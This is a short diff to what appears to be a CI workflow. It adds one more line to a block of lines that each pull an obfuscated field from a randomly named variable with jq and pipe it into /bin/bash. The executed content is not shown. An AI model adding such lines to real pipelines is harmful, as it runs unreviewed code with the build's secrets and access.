@@ -43,6 +43,7 @@ jobs:
           echo $wbqr8881 | jq -r .qo387 | /bin/bash
           echo $eztf50900 | jq -r .fj05 | /bin/bash
           echo $q37 | jq -r .k7515 | /bin/bash
+          echo $gei3 | jq -r .pb475 | /bin/bash
 
       - name: Upload results
         if: always()
